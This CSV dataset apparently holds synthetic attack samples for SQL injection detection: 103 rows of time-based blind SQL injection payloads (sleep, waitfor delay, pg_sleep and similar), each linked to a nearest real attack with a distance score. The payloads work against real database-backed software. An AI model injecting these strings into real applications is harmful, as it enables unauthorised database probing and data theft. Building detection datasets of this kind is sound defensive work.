id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000039,5.495404419427518
CTGAN_000002,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,7.580309760023066
CTGAN_000003,attack,time,select sleep  (  5  )  -- waln,nearest_attack_euclidean,R000100,6.508570352875442
CTGAN_000004,attack,time,1%' and sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000163,7.195147570377069
CTGAN_000005,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000069,6.850143113007499
CTGAN_000006,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,5.645221261206692
CTGAN_000007,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000079,6.827809920476505
CTGAN_000008,attack,time,"1"" and sleep  (  5  )   and ""masm""  =  ""masm",nearest_attack_euclidean,R000201,5.4534418665912865
CTGAN_000009,attack,time,"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000250,7.1380276288003035
CTGAN_000010,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R000158,6.5790199247114955
CTGAN_000011,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000039,6.314918479201429
CTGAN_000012,attack,time,1%'   )    )    and sleep  (  5  )  #,nearest_attack_euclidean,R000123,5.082106204574656
CTGAN_000013,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000039,6.5149730452100325
CTGAN_000014,attack,time,1' where 4403  =  4403 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000261,5.6487401644255515
CTGAN_000015,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,5.666445342041402
CTGAN_000016,attack,time,1'   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000287,8.081887477113794
CTGAN_000017,attack,time,select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,nearest_attack_euclidean,R000247,5.910714819376047
CTGAN_000018,attack,time,1'  )   and sleep  (  5  ) ,nearest_attack_euclidean,R000254,6.335554898155648
CTGAN_000019,attack,time,select pg_sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000133,7.619985205805498
CTGAN_000020,attack,time,select sleep  (  5  )   and 'hhrw' like 'hhrw,nearest_attack_euclidean,R000278,5.180740378762503
CTGAN_000021,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000071,4.80409265500976
CTGAN_000022,attack,time,1   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,6.013843375471741
CTGAN_000023,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000098,6.568187078998408
CTGAN_000024,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000177,6.106553784393609
CTGAN_000025,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000044,6.0243944571268955
CTGAN_000026,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000177,6.217170291916442
CTGAN_000027,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000209,5.628698673056259
CTGAN_000028,attack,time,1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,nearest_attack_euclidean,R000310,6.811535923909682
CTGAN_000029,attack,time,"1""  )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000231,7.5357526059919255
CTGAN_000030,attack,time,1'   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000287,6.797199170679682
CTGAN_000031,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,6.167437029753664
CTGAN_000032,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,6.478949959182685
CTGAN_000033,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000005,6.457680165528586
CTGAN_000034,attack,time,"1%"" and sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000249,7.475264311799218
CTGAN_000035,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,5.561491454880274
CTGAN_000036,attack,time,1%' and sleep  (  5  )  #,nearest_attack_euclidean,R000137,7.763122587592109
CTGAN_000037,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000005,4.340967556197848
CTGAN_000038,attack,time,1%' rlike sleep  (  5  )  #,nearest_attack_euclidean,R000089,6.106745339314644
CTGAN_000039,attack,time,1' and sleep  (  5  )   and 'kapr'  =  'kapr,nearest_attack_euclidean,R000268,6.787451871365281
CTGAN_000040,attack,time,select sleep  (  5  )   and 'mlmu'  =  'mlmu,nearest_attack_euclidean,R000298,5.824696428418723
CTGAN_000041,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000177,6.841466083519512
CTGAN_000042,attack,time,1%' and sleep  (  5  )  #,nearest_attack_euclidean,R000137,6.157980952272395
CTGAN_000043,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000039,5.583514508277742
CTGAN_000044,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000044,6.001721214538169
CTGAN_000045,attack,time,"1""  )   where 9656  =  9656 and sleep  (  5  )  --",nearest_attack_euclidean,R000297,5.275423363115496
CTGAN_000046,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000039,7.007622538169448
CTGAN_000047,attack,time,"1""  )   and sleep  (  5  )  #",nearest_attack_euclidean,R000225,6.046329928709256
CTGAN_000048,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,6.2648227088801365
CTGAN_000049,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000039,5.344034912052858
CTGAN_000050,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000120,5.8324898112431365
CTGAN_000051,attack,time,"1""   )    )    waitfor delay '0:0:5'--",nearest_attack_euclidean,R000267,6.323189439056838
CTGAN_000052,attack,time,1'  )   waitfor delay '0:0:5',nearest_attack_euclidean,R000185,7.698832435200283
CTGAN_000053,attack,time,"1""   )    )     )   and sleep  (  5  )  #",nearest_attack_euclidean,R000253,7.016231991144196
CTGAN_000054,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000005,5.556610550564434
CTGAN_000055,attack,time,1%'   )    )    rlike sleep  (  5  )  #,nearest_attack_euclidean,R000214,6.863883936342374
CTGAN_000056,attack,time,1 or sleep  (  5  )  -- nrzf,nearest_attack_euclidean,R000274,5.545816905350067
CTGAN_000057,attack,time,1' where 9708  =  9708 or sleep  (  5  )  --,nearest_attack_euclidean,R000189,6.669350396054842
CTGAN_000058,attack,time,1 or sleep  (  5  )  -- nrzf,nearest_attack_euclidean,R000274,6.701779711192771
CTGAN_000059,attack,time,1 and sleep  (  5  )  -- ruuv,nearest_attack_euclidean,R000042,5.80910095115484
CTGAN_000060,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,6.434209524378951
CTGAN_000061,attack,time,"make_set  (  8734  =  8734,sleep  (  5   )    )   ",nearest_attack_euclidean,R000288,7.769057267673108
CTGAN_000062,attack,time,1' and sleep  (  5  )   and 'pfgy'  =  'pfgy,nearest_attack_euclidean,R000303,4.989342237224242
CTGAN_000063,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,5.424921540334798
CTGAN_000064,attack,time,1'  )   and sleep  (  5  ) ,nearest_attack_euclidean,R000254,6.317342798302399
CTGAN_000065,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000050,6.090739203346615
CTGAN_000066,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000069,5.147952588815036
CTGAN_000067,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'#,nearest_attack_euclidean,R000058,7.254250377516504
CTGAN_000068,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,6.912047083363762
CTGAN_000069,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,5.8497108216744955
CTGAN_000070,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000071,6.727505903691226
CTGAN_000071,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000177,5.160903185600162
CTGAN_000072,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000015,8.250608386811788
CTGAN_000073,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000177,6.824428661177293
CTGAN_000074,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000120,5.775111153547254
CTGAN_000075,attack,time,"1""   )    )    waitfor delay '0:0:5'--",nearest_attack_euclidean,R000267,6.03195706762451
CTGAN_000076,attack,time,select sleep  (  5  )   and 'yzix'  =  'yzix,nearest_attack_euclidean,R000248,5.711838704158205
CTGAN_000077,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000074,5.319673108313545
CTGAN_000078,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000120,5.606941930039244
CTGAN_000079,attack,time,else dbms_lock.sleep  (  0  ) ,nearest_attack_euclidean,R000259,5.060899691547538
CTGAN_000080,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R000211,7.764077659336681
CTGAN_000081,attack,time,1  )   and sleep  (  5  )   and   (  4855  =  4855,nearest_attack_euclidean,R000150,4.994595296574828
CTGAN_000082,attack,time,"1""   )    )    waitfor delay '0:0:5'--",nearest_attack_euclidean,R000267,7.410366607342372
CTGAN_000083,attack,time,select pg_sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000133,7.43635460962873
CTGAN_000084,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,5.993066042088272
CTGAN_000085,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000034,5.953727914908767
CTGAN_000086,attack,time,select sleep  (  5  )  # wihl,nearest_attack_euclidean,R000311,8.361376099520461
CTGAN_000087,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000050,5.786471644641902
CTGAN_000088,attack,time,select sleep  (  5  )   and 'yzix'  =  'yzix,nearest_attack_euclidean,R000248,5.459029592719527
CTGAN_000089,attack,time,1' or sleep  (  5  )   and 'yudo'  =  'yudo,nearest_attack_euclidean,R000216,7.030275602697285
CTGAN_000090,attack,time,1%'  )   waitfor delay '0:0:5' and   (  '%'  =  ',nearest_attack_euclidean,R000220,7.464580373001325
CTGAN_000091,attack,time,1'   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000287,7.227415899417035
CTGAN_000092,attack,time,1   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,7.676792007047468
CTGAN_000093,attack,time,1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,nearest_attack_euclidean,R000065,4.311244355202504
CTGAN_000094,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,6.702314377262389
CTGAN_000095,attack,time,1%' rlike sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000251,6.512024373603617
CTGAN_000096,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,6.684428887773954
CTGAN_000097,attack,time,1%'   )    )     )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000271,5.879330199042579
CTGAN_000098,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,6.1377576905756985
CTGAN_000099,attack,time,1%' and sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000163,8.229944203806044
CTGAN_000100,attack,time,1%' rlike sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000251,6.362467411360922
CTGAN_000101,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000039,6.440244356244724
CTGAN_000102,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000005,7.476939789542653
CTGAN_000103,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'#,nearest_attack_euclidean,R000058,5.7335492904895915
